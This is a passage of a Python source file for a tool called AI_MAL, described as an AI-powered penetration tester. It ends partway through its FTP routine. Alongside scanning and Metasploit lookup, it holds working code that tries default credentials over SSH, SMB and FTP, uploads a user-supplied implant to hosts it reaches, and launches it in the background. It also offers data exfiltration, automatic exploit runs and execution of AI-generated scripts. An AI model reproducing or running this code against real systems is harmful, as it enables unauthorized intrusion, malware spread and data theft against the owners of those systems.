#!/usr/bin/env python3
"""AI_MAL - AI-Powered Penetration Testing Tool"""

import argparse
import logging
import os
import sys
import time
import asyncio
import json
from typing import Optional, List, Dict, Any
from datetime import datetime
from pathlib import Path
import platform
from dotenv import load_dotenv
import aiohttp
import io
from urllib.parse import urljoin

# Suppress asyncio warnings about event loop being closed - compatible with Python 3.11+ and 3.12+
import warnings
warnings.filterwarnings("ignore", 
                       message="Exception ignored in.*asyncio.*",
                       category=RuntimeWarning)

# More compatible approach to handle different Python versions
try:
    # For older Python versions
    if hasattr(asyncio, 'events') and hasattr(asyncio.events, 'BaseEventLoop'):
        original_check_closed = asyncio.events.BaseEventLoop._check_closed
        def _patched_check_closed(self):
            if self._closed:
                # Instead of raising an exception, just return
                return
            return original_check_closed(self)
        asyncio.events.BaseEventLoop._check_closed = _patched_check_closed
    # For Python 3.12+
    elif hasattr(asyncio, 'base_events') and hasattr(asyncio.base_events, 'BaseEventLoop'):
        original_check_closed = asyncio.base_events.BaseEventLoop._check_closed
        def _patched_check_closed(self):
            if self._closed:
                # Instead of raising an exception, just return
                return
            return original_check_closed(self)
        asyncio.base_events.BaseEventLoop._check_closed = _patched_check_closed
except (AttributeError, TypeError):
    # If we can't patch directly, we'll handle the warnings with the filter only
    pass

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.table import Table
    from rich.live import Live
    from rich import print as rprint
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

from ai_mal.core.adaptive import AdaptiveScanner
from ai_mal.core.ai_manager import AIManager
from ai_mal.core.metasploit import MetasploitManager
from ai_mal.core.script_generator import ScriptGenerator

# Load environment variables
load_dotenv()

# Configure logging
log_dir = os.getenv('LOG_DIR', 'logs')
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, 'ai_mal.log')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Set up rich console if available
if RICH_AVAILABLE:
    console = Console()
else:
    console = None

class AI_MAL:
    def __init__(self, target: str, **kwargs):
        self.target = target
        self.kwargs = kwargs
        self.scanner = AdaptiveScanner(target)
        self.ai_manager = AIManager(
            model=kwargs.get('model', os.getenv('OLLAMA_MODEL', 'qwen2.5-coder:7b')),
            fallback_model=kwargs.get('fallback_model', os.getenv('OLLAMA_FALLBACK_MODEL', 'mistral:7b'))
        )
        # Create a workspace name based on target and timestamp
        workspace = f"ai_mal_{target.replace('.', '_')}_{datetime.now().strftime('%Y%m%d')}"
        self.metasploit = MetasploitManager(workspace=workspace) if kwargs.get('msf') else None
        self.script_generator = ScriptGenerator()
        self.quiet = kwargs.get('quiet', False)
        self.no_gui = kwargs.get('no_gui', False)
        
        # Setup for data exfiltration
        self.exfil_enabled = kwargs.get('exfil', False)
        if self.exfil_enabled:
            self.exfil_dir = Path(os.getenv('EXFIL_DIR', 'exfiltrated_data'))
            self.exfil_dir.mkdir(exist_ok=True)
            self.exfil_target_dir = self.exfil_dir / target.replace('.', '_')
            self.exfil_target_dir.mkdir(exist_ok=True)
            logger.info(f"Data exfiltration enabled. Files will be saved to {self.exfil_target_dir}")
            
        # Setup for implant deployment
        self.implant_enabled = kwargs.get('implant') is not None
        self.implant_path = kwargs.get('implant')
        if self.implant_enabled:
            if not os.path.exists(self.implant_path):
                logger.error(f"Implant script not found: {self.implant_path}")
                self.implant_enabled = False
            else:
                logger.info(f"Implant enabled. Will attempt to deploy {self.implant_path} to target systems")
                # Create directory for implant logs
                self.implant_logs_dir = Path('implant_logs')
                self.implant_logs_dir.mkdir(exist_ok=True)
        
    async def run(self):
        try:
            # Show welcome banner
            if RICH_AVAILABLE and not self.quiet and not self.no_gui:
                self._show_banner()
                
            # Show scanning progress
            if RICH_AVAILABLE and not self.quiet and not self.no_gui:
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[bold green]{task.description}"),
                    BarColumn(),
                    TimeElapsedColumn(),
                    console=console
                ) as progress:
                    scan_task = progress.add_task(f"[green]Scanning target: {self.target}", total=100)
                    progress.update(scan_task, advance=10)
                    
                    # Perform initial scan
                    scan_results = await self.scanner.scan(
                        stealth=self.kwargs.get('stealth', False),
                        continuous=self.kwargs.get('continuous', False),
                        delay=self.kwargs.get('delay', 300),
                        services=self.kwargs.get('services', False),
                        version=self.kwargs.get('version', False),
                        os_detection=self.kwargs.get('os', False),
                        vuln_scan=self.kwargs.get('vuln', False),
                        dos=self.kwargs.get('dos', False)
                    )
                    progress.update(scan_task, completed=100)
                    
                    # Show scan results summary
                    self._display_scan_summary(scan_results)
                    
                    # Exfiltration
                    exfil_results = None
                    if self.exfil_enabled:
                        exfil_task = progress.add_task("[red]Attempting data exfiltration...", total=100)
                        progress.update(exfil_task, advance=10)
                        
                        logger.info("Attempting data exfiltration from target...")
                        exfil_results = await self._exfiltrate_data(scan_results)
                        progress.update(exfil_task, completed=100)
                        
                        # Display exfiltration results
                        self._display_exfil_results(exfil_results)
                    
                    # Implant deployment
                    implant_results = None
                    if self.implant_enabled:
                        implant_task = progress.add_task("[red bold]Deploying implant to target systems...", total=100)
                        progress.update(implant_task, advance=10)
                        
                        logger.info(f"Attempting to deploy implant: {self.implant_path}")
                        implant_results = await self._deploy_implant(scan_results)
                        progress.update(implant_task, completed=100)
                        
                        # Display implant results
                        self._display_implant_results(implant_results)
                    
                    # AI Analysis
                    analysis = None
                    if self.kwargs.get('ai_analysis', True):
                        ai_task = progress.add_task("[cyan]Analyzing results with AI...", total=100)
                        progress.update(ai_task, advance=30)
                        
                        logger.info("Analyzing scan results with AI...")
                        analysis = await self.ai_manager.analyze_results(scan_results)
                        progress.update(ai_task, completed=100)
                        
                        # Display AI analysis results
                        self._display_ai_results(analysis)
                    
                    # Metasploit Integration
                    exploits = []
                    if self.metasploit and self.kwargs.get('exploit', False):
                        msf_task = progress.add_task("[yellow]Finding potential Metasploit exploits...", total=100)
                        progress.update(msf_task, advance=40)
                        
                        logger.info("Finding potential Metasploit exploits...")
                        exploits = await self.metasploit.find_exploits(scan_results)
                        progress.update(msf_task, completed=100)
                        
                        if exploits:
                            logger.info(f"Found {len(exploits)} potential Metasploit exploits:")
                            for exploit in exploits:
                                logger.info(f"- {exploit['name']} ({exploit['rank']}): {exploit['description']}")
                            
                            # Display exploits
                            self._display_exploits(exploits)
                            
                            if self.kwargs.get('full_auto', False):
                                exploit_task = progress.add_task("[red]Running exploits in full-auto mode...", total=100)
                                progress.update(exploit_task, advance=20)
                                
                                logger.info("Running exploits in full-auto mode...")
                                exploit_results = await self.metasploit.run_exploits(exploits)
                                progress.update(exploit_task, completed=100)
                                
                                for result in exploit_results:
                                    logger.info(f"Exploit {result['exploit']['name']} result: {result['result']['status']}")
                        else:
                            logger.info("No suitable exploits found for the target.")
                    
                    # Custom Script Generation
                    if self.kwargs.get('custom_scripts', False):
                        script_type = self.kwargs.get('script_type', 'python')
                        script_task = progress.add_task(f"[blue]Generating {script_type} scripts...", total=100)
                        progress.update(script_task, advance=30)
                        
                        logger.info(f"Generating custom {script_type} scripts...")
                        scripts = await self.script_generator.generate_scripts(
                            scan_results,
                            script_type=script_type
                        )
                        progress.update(script_task, completed=100)
                        
                        logger.info(f"Generated {len(scripts)} {script_type} scripts:")
                        for script in scripts:
                            logger.info(f"- {script['name']}: {script['description']} ({script['path']})")
                        
                        # Display generated scripts
                        self._display_scripts(scripts)
                        
                        if self.kwargs.get('execute_scripts', False):
                            exec_task = progress.add_task("[magenta]Executing generated scripts...", total=100)
                            progress.update(exec_task, advance=20)
                            
                            logger.info("Executing generated scripts...")
                            script_results = await self.script_generator.execute_scripts(scripts)
                            progress.update(exec_task, completed=100)
                            
                            for result in script_results:
                                status = result['result']['status']
                                script_name = result['script']['name']
                                logger.info(f"Script {script_name} execution: {status}")
            else:
                # Non-rich version - run without the progress display
                # Perform initial scan
                logger.info(f"Scanning target: {self.target}")
                scan_results = await self.scanner.scan(
                    stealth=self.kwargs.get('stealth', False),
                    continuous=self.kwargs.get('continuous', False),
                    delay=self.kwargs.get('delay', 300),
                    services=self.kwargs.get('services', False),
                    version=self.kwargs.get('version', False),
                    os_detection=self.kwargs.get('os', False),
                    vuln_scan=self.kwargs.get('vuln', False),
                    dos=self.kwargs.get('dos', False)
                )
                logger.info(f"Scan completed on target: {self.target}")

                # Exfiltration
                exfil_results = None
                if self.exfil_enabled:
                    logger.info("Attempting data exfiltration from target...")
                    exfil_results = await self._exfiltrate_data(scan_results)
                
                # Implant deployment
                implant_results = None
                if self.implant_enabled:
                    logger.info(f"Attempting to deploy implant: {self.implant_path}")
                    implant_results = await self._deploy_implant(scan_results)
                
                # AI Analysis
                analysis = None
                if self.kwargs.get('ai_analysis', True):
                    logger.info("Analyzing scan results with AI...")
                    analysis = await self.ai_manager.analyze_results(scan_results)
                    model_used = analysis.get('model_used', 'Unknown')
                    logger.info(f"AI Analysis Results (using model: {model_used}):")
                    for key, value in analysis.items():
                        if key == 'model_used':
                            continue
                        if isinstance(value, list):
                            logger.info(f"{key.upper()}:")
                            for item in value:
                                logger.info(f"- {item}")
                        else:
                            logger.info(f"{key.upper()}: {value}")

                # Metasploit Integration
                exploits = []
                if self.metasploit and self.kwargs.get('exploit', False):
                    logger.info("Finding potential Metasploit exploits...")
                    exploits = await self.metasploit.find_exploits(scan_results)
                    if exploits:
                        logger.info(f"Found {len(exploits)} potential Metasploit exploits:")
                        for exploit in exploits:
                            logger.info(f"- {exploit['name']} ({exploit['rank']}): {exploit['description']}")
                        
                        if self.kwargs.get('full_auto', False):
                            logger.info("Running exploits in full-auto mode...")
                            exploit_results = await self.metasploit.run_exploits(exploits)
                            for result in exploit_results:
                                logger.info(f"Exploit {result['exploit']['name']} result: {result['result']['status']}")
                    else:
                        logger.info("No suitable exploits found for the target.")

                # Custom Script Generation
                if self.kwargs.get('custom_scripts', False):
                    script_type = self.kwargs.get('script_type', 'python')
                    logger.info(f"Generating custom {script_type} scripts...")
                    scripts = await self.script_generator.generate_scripts(
                        scan_results,
                        script_type=script_type
                    )
                    
                    logger.info(f"Generated {len(scripts)} {script_type} scripts:")
                    for script in scripts:
                        logger.info(f"- {script['name']}: {script['description']} ({script['path']})")
                    
                    if self.kwargs.get('execute_scripts', False):
                        logger.info("Executing generated scripts...")
                        script_results = await self.script_generator.execute_scripts(scripts)
                        for result in script_results:
                            status = result['result']['status']
                            script_name = result['script']['name']
                            logger.info(f"Script {script_name} execution: {status}")

            # Show completion message
            if RICH_AVAILABLE and not self.quiet and not self.no_gui:
                console.print(Panel.fit("Scan completed successfully!", 
                                          border_style="green", 
                                          title="AI_MAL"))
            else:
                logger.info("Scan completed successfully!")

            return scan_results

        except Exception as e:
            logger.error(f"Error during scan: {str(e)}")
            if RICH_AVAILABLE and not self.quiet:
                console.print(Panel.fit(f"Error: {str(e)}", 
                                          border_style="red", 
                                          title="AI_MAL Error"))
            raise
            
    def _show_banner(self):
        """Show the AI_MAL welcome banner"""
        banner = """
    █████╗ ██╗      ███╗   ███╗ █████╗ ██╗     
   ██╔══██╗██║      ████╗ ████║██╔══██╗██║     
   ███████║██║█████╗██╔████╔██║███████║██║     
   ██╔══██║██║╚════╝██║╚██╔╝██║██╔══██║██║     
   ██║  ██║██║      ██║ ╚═╝ ██║██║  ██║███████╗
   ╚═╝  ╚═╝╚═╝      ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
                                                 
   AI-Powered Penetration Testing Tool
        """
        console.print(Panel(banner, border_style="green"))
        console.print(f"Target: [bold red]{self.target}[/bold red]")
        
        # Display primary and fallback models
        primary_model = self.ai_manager.primary_model
        fallback_model = self.ai_manager.fallback_model
        console.print(f"Primary AI: [bold cyan]{primary_model}[/bold cyan]")
        
        if fallback_model:
            console.print(f"Fallback AI: [bold blue]{fallback_model}[/bold blue]")
        
        # Display available models
        if self.ai_manager.available_models:
            model_count = len(self.ai_manager.available_models)
            console.print(f"Available models: [green]{model_count}[/green] Ollama models detected")
            
        # Display additional scan information
        scan_type = "Aggressive" if self.kwargs.get('vuln', False) else "Stealth" if self.kwargs.get('stealth', False) else "Standard"
        console.print(f"Scan type: [yellow]{scan_type}[/yellow]")
        
        if self.kwargs.get('msf', False):
            console.print(f"[red]Metasploit integration: Enabled[/red]")
            
        if self.kwargs.get('full_auto', False):
            console.print(f"[red bold]Full auto mode: Enabled[/red bold]")
            
        console.print()
        
    def _display_scan_summary(self, scan_results: Dict[str, Any]):
        """Display a summary of scan results in a table"""
        if not RICH_AVAILABLE or self.quiet:
            return
            
        table = Table(title=f"Scan Summary for {self.target}")
        table.add_column("Host", style="cyan")
        table.add_column("Status", style="green")
        table.add_column("Open Ports", style="yellow")
        table.add_column("OS", style="magenta")
        
        for host in scan_results.get('hosts', []):
            ip = host.get('ip', 'Unknown')
            status = host.get('status', 'Unknown')
            
            # Get open ports
            open_ports = []
            for port_info in host.get('ports', []):
                if port_info.get('state') == 'open':
                    port = port_info.get('port')
                    service = port_info.get('service', '')
                    open_ports.append(f"{port}/{service}")
            
            ports_str = ", ".join(open_ports[:5])
            if len(open_ports) > 5:
                ports_str += f" (+{len(open_ports) - 5} more)"
                
            # Get OS info
            os_info = host.get('os', {}).get('name', 'Unknown')
            
            table.add_row(ip, status, ports_str, os_info)
            
        console.print(table)
        
    def _display_ai_results(self, analysis: Dict[str, Any]):
        """Display AI analysis results in a formatted panel"""
        if not RICH_AVAILABLE or self.quiet or not analysis:
            return
            
        # Create a table for the analysis results
        model_used = analysis.get('model_used', 'Unknown')
        model_style = {
            'fallback': 'red',
            'Unknown': 'dim red'
        }.get(model_used, 'cyan')
        
        table = Table(title=f"AI Analysis Results [using {model_used}]")
        table.add_column("Category", style="cyan")
        table.add_column("Details", style="green")
        
        # Risk level
        risk_level = analysis.get('risk_level', 'UNKNOWN')
        risk_style = {
            'LOW': 'green',
            'MEDIUM': 'yellow',
            'HIGH': 'red',
            'CRITICAL': 'red bold',
            'UNKNOWN': 'dim'
        }.get(risk_level, 'white')
        
        table.add_row("Risk Level", f"[{risk_style}]{risk_level}[/{risk_style}]")
        
        # Summary
        summary = analysis.get('summary', 'No summary available')
        table.add_row("Summary", summary)
        
        # Vulnerabilities
        vulns = analysis.get('vulnerabilities', [])
        vulns_str = "\n".join([f"• {v}" for v in vulns[:5]])
        if len(vulns) > 5:
            vulns_str += f"\n• (+{len(vulns) - 5} more)"
        if not vulns:
            vulns_str = "None detected"
        table.add_row("Vulnerabilities", vulns_str)
        
        # Attack vectors
        vectors = analysis.get('attack_vectors', [])
        vectors_str = "\n".join([f"• {v}" for v in vectors[:5]])
        if len(vectors) > 5:
            vectors_str += f"\n• (+{len(vectors) - 5} more)"
        if not vectors:
            vectors_str = "None detected"
        table.add_row("Attack Vectors", vectors_str)
        
        # Recommendations
        recommendations = analysis.get('recommendations', [])
        recommendations_str = "\n".join([f"• {r}" for r in recommendations[:5]])
        if len(recommendations) > 5:
            recommendations_str += f"\n• (+{len(recommendations) - 5} more)"
        if not recommendations:
            recommendations_str = "None provided"
        table.add_row("Recommendations", recommendations_str)
        
        console.print(table)
        
    def _display_exploits(self, exploits: List[Dict[str, Any]]):
        """Display found Metasploit exploits in a table"""
        if not RICH_AVAILABLE or self.quiet or not exploits:
            return
            
        table = Table(title=f"Potential Exploits for {self.target}")
        table.add_column("Name", style="cyan")
        table.add_column("Rank", style="green")
        table.add_column("Description", style="yellow")
        
        for exploit in exploits[:10]:  # Limit to 10 exploits to avoid overwhelming the display
            name = exploit.get('name', 'Unknown')
            rank = exploit.get('rank', 'Unknown')
            description = exploit.get('description', 'No description')
            
            # Set color based on rank
            rank_style = {
                'excellent': 'bright_green',
                'great': 'green',
                'good': 'yellow',
                'normal': 'blue',
                'average': 'cyan',
                'low': 'magenta',
                'manual': 'red'
            }.get(rank.lower(), 'white')
            
            table.add_row(name, f"[{rank_style}]{rank}[/{rank_style}]", description)
            
        if len(exploits) > 10:
            console.print(f"Showing 10 of {len(exploits)} exploits")
            
        console.print(table)
        
    def _display_scripts(self, scripts: List[Dict[str, Any]]):
        """Display generated scripts in a table"""
        if not RICH_AVAILABLE or self.quiet or not scripts:
            return
            
        table = Table(title="Generated Scripts")
        table.add_column("Name", style="cyan")
        table.add_column("Type", style="green")
        table.add_column("Description", style="yellow")
        table.add_column("Path", style="magenta")
        
        for script in scripts:
            name = script.get('name', 'Unknown')
            script_type = script.get('type', 'Unknown')
            description = script.get('description', 'No description')
            path = script.get('path', 'Unknown')
            
            table.add_row(name, script_type, description, path)
            
        console.print(table)
        
    def _display_exfil_results(self, results: Dict[str, Any]):
        """Display exfiltration results in a table"""
        if not RICH_AVAILABLE or self.quiet or not results:
            return
            
        # Create a table for the exfiltration results
        table = Table(title=f"[bold red]Data Exfiltration Results[/bold red]")
        table.add_column("Status", style="bold")
        table.add_column("Details", style="cyan")
        
        # Status row
        status = "[green]SUCCESS[/green]" if results.get('success', False) else "[red]FAILED[/red]"
        table.add_row("Status", status)
        
        # Files retrieved
        files_count = results.get('files_retrieved', 0)
        files_style = "green" if files_count > 0 else "red"
        table.add_row("Files Retrieved", f"[{files_style}]{files_count}[/{files_style}]")
        
        # Methods succeeded
        methods = results.get('methods_succeeded', [])
        methods_str = ", ".join(methods) if methods else "None"
        table.add_row("Successful Methods", methods_str)
        
        # Methods attempted
        attempted = results.get('methods_attempted', [])
        attempted_str = ", ".join(attempted) if attempted else "None"
        table.add_row("Attempted Methods", attempted_str)
        
        # Storage location
        if files_count > 0:
            table.add_row("Storage Location", str(self.exfil_target_dir))
        
        console.print(table)
        
        # If successful, show a warning about the exfiltrated data
        if results.get('success', False):
            console.print(Panel(
                "[bold yellow]Warning:[/bold yellow] Sensitive data may have been exfiltrated. "
                "Review the contents carefully and handle according to your security policy.",
                border_style="red"
            ))

    def _display_implant_results(self, results: Dict[str, Any]):
        """Display implant deployment results in a table"""
        if not RICH_AVAILABLE or self.quiet or not results:
            return
            
        # Create a table for the implant results
        table = Table(title=f"[bold red]Implant Deployment Results[/bold red]")
        table.add_column("Status", style="bold")
        table.add_column("Details", style="cyan")
        
        # Status row
        status = "[green]SUCCESS[/green]" if results.get('success', False) else "[red]FAILED[/red]"
        table.add_row("Status", status)
        
        # Targets implanted
        implant_count = len(results.get('successful_targets', []))
        implant_style = "green" if implant_count > 0 else "red"
        table.add_row("Targets Implanted", f"[{implant_style}]{implant_count}[/{implant_style}]")
        
        # Successful targets
        successful = results.get('successful_targets', [])
        successful_str = "\n".join(successful) if successful else "None"
        table.add_row("Successful Targets", successful_str)
        
        # Failed targets
        failed = results.get('failed_targets', [])
        failed_str = "\n".join(failed) if failed else "None"
        table.add_row("Failed Targets", failed_str)
        
        # Methods succeeded
        methods = results.get('methods_succeeded', [])
        methods_str = ", ".join(methods) if methods else "None"
        table.add_row("Successful Methods", methods_str)
        
        # Implant file
        table.add_row("Implant Script", str(self.implant_path))
        
        console.print(table)
        
        # If successful, show a warning about the implanted targets
        if results.get('success', False):
            console.print(Panel(
                "[bold yellow]Warning:[/bold yellow] Implants have been deployed to target systems. "
                "Ensure proper cleanup once operations are complete.",
                border_style="red"
            ))

    async def _deploy_implant(self, scan_results: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to deploy implant script to target systems using multiple methods
        
        Args:
            scan_results: Results from nmap scan containing target information
            
        Returns:
            Dictionary with implant deployment results
        """
        if not self.implant_enabled or not self.implant_path:
            return {'success': False}
            
        logger.info(f"Starting implant deployment to {self.target}")
        results = {
            'success': False,
            'successful_targets': [],
            'failed_targets': [],
            'methods_succeeded': [],
            'methods_attempted': []
        }
        
        hosts = scan_results.get('hosts', [])
        if not hosts:
            logger.warning("No hosts found in scan results for implant deployment")
            return results
        
        # Read the implant script
        try:
            with open(self.implant_path, 'rb') as f:
                implant_content = f.read()
        except Exception as e:
            logger.error(f"Error reading implant script: {str(e)}")
            return results
            
        # Determine script type based on extension
        script_extension = os.path.splitext(self.implant_path)[1].lower()
        
        # Create timestamp for this deployment attempt
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        implant_log_file = self.implant_logs_dir / f"implant_log_{timestamp}.txt"
        
        # Log the deployment attempt
        with open(implant_log_file, 'w') as log:
            log.write(f"Implant deployment at {timestamp}\n")
            log.write(f"Target: {self.target}\n")
            log.write(f"Implant: {self.implant_path}\n\n")
        
        for host in hosts:
            ip = host.get('ip')
            if not ip:
                continue
                
            logger.info(f"Attempting to deploy implant to {ip}")
            
            # Log current host
            with open(implant_log_file, 'a') as log:
                log.write(f"\nAttempting to implant {ip}:\n")
            
            # Extract information about open ports and services
            open_ports = {}
            for port_info in host.get('ports', []):
                if port_info.get('state') == 'open':
                    port = port_info.get('port')
                    service = port_info.get('service', '')
                    open_ports[port] = service
            
            # Attempt different implant methods based on available services
            implant_success = False
            
            # Try SSH implant
            if await self._implant_via_ssh(ip, open_ports, implant_content, script_extension, implant_log_file):
                results['methods_succeeded'].append('ssh')
                implant_success = True
                
            results['methods_attempted'].append('ssh')
                
            # Try SMB implant
            if await self._implant_via_smb(ip, open_ports, implant_content, script_extension, implant_log_file):
                results['methods_succeeded'].append('smb')
                implant_success = True
                
            results['methods_attempted'].append('smb')
                
            # Try FTP implant
            if await self._implant_via_ftp(ip, open_ports, implant_content, script_extension, implant_log_file):
                results['methods_succeeded'].append('ftp')
                implant_success = True
                
            results['methods_attempted'].append('ftp')
            
            # Try HTTP/web upload implant
            if await self._implant_via_http(ip, open_ports, implant_content, script_extension, implant_log_file):
                results['methods_succeeded'].append('http')
                implant_success = True
                
            results['methods_attempted'].append('http')
            
            # Update results based on success
            if implant_success:
                results['successful_targets'].append(ip)
                results['success'] = True
            else:
                results['failed_targets'].append(ip)
        
        # Log summary
        with open(implant_log_file, 'a') as log:
            log.write("\n\nSummary:\n")
            log.write(f"Successful targets: {len(results['successful_targets'])}\n")
            for target in results['successful_targets']:
                log.write(f"- {target}\n")
            log.write(f"Failed targets: {len(results['failed_targets'])}\n")
            for target in results['failed_targets']:
                log.write(f"- {target}\n")
            log.write(f"Methods succeeded: {', '.join(results['methods_succeeded'])}\n")
        
        logger.info(f"Implant deployment complete. Successful targets: {len(results['successful_targets'])}")
        return results
        
    async def _implant_via_ssh(self, target: str, open_ports: Dict[int, str], 
                             implant_content: bytes, script_extension: str,
                             log_file: Path) -> bool:
        """Deploy implant via SSH if available"""
        try:
            import paramiko
        except ImportError:
            logger.warning("SSH implant requires paramiko module. Install with 'pip install paramiko'")
            return False
            
        # Look for SSH ports (22, 2222, etc)
        ssh_ports = [port for port, service in open_ports.items() 
                    if service.lower() == 'ssh' or port == 22]
        
        if not ssh_ports:
            logger.debug(f"No SSH service detected on {target}")
            return False
            
        # Common username/password combinations to try
        credentials = [
            ('root', 'root'),
            ('root', 'toor'),
            ('root', 'password'),
            ('admin', 'admin'),
            ('user', 'user'),
            ('kali', 'kali')
        ]
        
        script_name = os.path.basename(self.implant_path)
        
        # Prepare execution commands based on script type
        exec_commands = {
            '.py': f"python3 /tmp/{script_name} &",
            '.sh': f"bash /tmp/{script_name} &",
            '.rb': f"ruby /tmp/{script_name} &",
            '.pl': f"perl /tmp/{script_name} &",
            '.php': f"php /tmp/{script_name} &"
        }
        
        default_exec = f"chmod +x /tmp/{script_name} && /tmp/{script_name} &"
        exec_command = exec_commands.get(script_extension, default_exec)
        
        success = False
        for port in ssh_ports:
            for username, password in credentials:
                try:
                    # Connect to SSH server
                    logger.info(f"Attempting SSH implant on {target}:{port} with {username}:{password}")
                    
                    # Log attempt
                    with open(log_file, 'a') as log:
                        log.write(f"  SSH attempt: {target}:{port} with {username}:{password}\n")
                    
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(target, port=port, username=username, password=password, timeout=10)
                    
                    # Upload the implant script
                    sftp = client.open_sftp()
                    remote_path = f"/tmp/{script_name}"
                    sftp.putfo(io.BytesIO(implant_content), remote_path)
                    sftp.chmod(remote_path, 0o755)  # Make it executable
                    sftp.close()
                    
                    logger.info(f"Successfully uploaded implant to {target} via SSH")
                    with open(log_file, 'a') as log:
                        log.write(f"  [SUCCESS] Uploaded implant to {remote_path}\n")
                    
                    # Execute the implant
                    stdin, stdout, stderr = client.exec_command(exec_command)
                    
                    # Wait briefly for execution to start
                    exit_status = stdout.channel.recv_exit_status()
                    
                    if exit_status == 0:
                        logger.info(f"Successfully executed implant on {target} via SSH")
                        with open(log_file, 'a') as log:
                            log.write(f"  [SUCCESS] Executed implant with command: {exec_command}\n")
                        success = True
                    else:
                        error = stderr.read().decode()
                        logger.warning(f"Failed to execute implant on {target}: {error}")
                        with open(log_file, 'a') as log:
                            log.write(f"  [ERROR] Failed to execute: {error}\n")
                    
                    client.close()
                    
                    if success:
                        return True
                    
                except Exception as e:
                    logger.debug(f"SSH implant attempt failed: {str(e)}")
                    with open(log_file, 'a') as log:
                        log.write(f"  [ERROR] {str(e)}\n")
                    
        return success
        
    async def _implant_via_smb(self, target: str, open_ports: Dict[int, str],
                             implant_content: bytes, script_extension: str,
                             log_file: Path) -> bool:
        """Deploy implant via SMB if available"""
        try:
            import smbclient
        except ImportError:
            logger.warning("SMB implant requires smbclient module. Install with 'pip install smbclient'")
            return False
            
        # Look for SMB ports (139, 445)
        smb_ports = [port for port, service in open_ports.items() 
                    if service.lower() in ['smb', 'microsoft-ds', 'netbios-ssn'] 
                    or port in [139, 445]]
        
        if not smb_ports:
            logger.debug(f"No SMB service detected on {target}")
            return False
            
        # Common username/password combinations to try
        credentials = [
            ('guest', ''),
            ('', ''),
            ('Administrator', ''),
            ('Administrator', 'administrator'),
            ('Administrator', 'password'),
            ('admin', 'admin'),
            ('user', 'user')
        ]
        
        script_name = os.path.basename(self.implant_path)
        success = False
        
        for username, password in credentials:
            try:
                # Connect to SMB server
                logger.info(f"Attempting SMB implant on {target} with {username}:{password}")
                
                # Log attempt
                with open(log_file, 'a') as log:
                    log.write(f"  SMB attempt: {target} with {username}:{password}\n")
                
                # Configure SMB client
                smbclient.ClientConfig(username=username, password=password)
                
                # Try to find a writable share
                try:
                    shares = smbclient.listdir(f'\\\\{target}\\')
                except Exception as e:
                    logger.debug(f"Error listing SMB shares: {str(e)}")
                    with open(log_file, 'a') as log:
                        log.write(f"  [ERROR] Listing shares: {str(e)}\n")
                    continue
                
                writable_paths = [
                    (share, '\\Windows\\Temp\\'),
                    (share, '\\Temp\\'),
                    (share, '\\'),
                    ('C$', '\\Windows\\Temp\\'),
                    ('C$', '\\Temp\\'),
                    ('ADMIN$', '\\Temp\\'),
                    ('IPC$', '\\')
                ]
                
                for share, path in writable_paths:
                    try:
                        if share not in shares and not share.endswith('$'):
                            continue
                            
                        # Try to write to this location
                        unc_path = f'\\\\{target}\\{share}{path}{script_name}'
                        
                        logger.debug(f"Attempting to write to {unc_path}")
                        with open(log_file, 'a') as log:
                            log.write(f"  Trying to write to {unc_path}\n")
                        
                        with smbclient.open_file(unc_path, mode='wb') as f:
                            f.write(implant_content)
                            
                        logger.info(f"Successfully uploaded implant to {target} via SMB")
                        with open(log_file, 'a') as log:
                            log.write(f"  [SUCCESS] Uploaded implant to {unc_path}\n")
                            
                        # SMB upload succeeded, but execution is more difficult
                        # We would need a more complex method to execute it remotely
                        # For Windows targets, we could use PsExec or WMI/WinRM if available
                        
                        # For now, just mark as partial success
                        with open(log_file, 'a') as log:
                            log.write(f"  [NOTE] Implant uploaded but not executed. Manual execution required.\n")
                            
                        success = True
                        break
                        
                    except Exception as e:
                        logger.debug(f"Failed to write to {share}{path}: {str(e)}")
                        
                if success:
                    break
                    
            except Exception as e:
                logger.debug(f"SMB implant attempt failed: {str(e)}")
                with open(log_file, 'a') as log:
                    log.write(f"  [ERROR] {str(e)}\n")
                
        return success
        
    async def _implant_via_ftp(self, target: str, open_ports: Dict[int, str],
                             implant_content: bytes, script_extension: str,
                             log_file: Path) -> bool:
        """Deploy implant via FTP if available"""
        import ftplib
        
        # Look for FTP ports (21, 2121, etc)
        ftp_ports = [port for port, service in open_ports.items() 
                    if service.lower() == 'ftp' or port == 21]
        
        if not ftp_ports:
            logger.debug(f"No FTP service detected on {target}")
            return False
            
        # Common username/password combinations to try
        credentials = [
            ('anonymous', 'anonymous@domain.com'),
            ('anonymous', ''),
            ('ftp', 'ftp'),
            ('admin', 'admin'),
            ('user', 'user'),
            ('guest', 'guest')
        ]
        
        script_name = os.path.basename(self.implant_path)
        success = False
        
        for port in ftp_ports:
            for username, password in credentials:
                try:
                    # Connect to FTP server
                    logger.info(f"Attempting FTP implant on {target}:{port} with {username}:{password}")
                    
                    # Log attempt
                    with open(log_file, 'a') as log:
                        log.write(f"  FTP attempt: {target}:{port} with {username}:{password}\n")
                    
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=10)
                    ftp.login(username, password)
                    
                    logger.info(f"FTP login successful on {target}:{port}")
                    
                    # Try to determine current directory and if we can write to it
                    try:
                        cwd = ftp.pwd()
                        
                        # Attempt to upload the implant
                        ftp.storbinary(f'STOR {script_name}', io.BytesIO(implant_content))
                        
                        logger.info(f"Successfully uploaded implant to {target} via FTP")
                        with open(log_file, 'a') as log:
                            log.write(f"  [SUCCESS] Uploaded implant to {cwd}/{script_name}\n")
                            
                        # FTP upload succeeded, but we can't execute it directly
                        # We need another access method (like SSH) to execute it
                        with open(log_file, 'a') as log:
                            log.write(f"  [NOTE] Implant uploaded but not executed. Manual execution required.\n")
                            
                        success = True
                        
                    except Exception as e:
                        logger.debug(f"Failed to upload file via FTP: {str(e)}")
                        with open(log_file, 'a') as log:
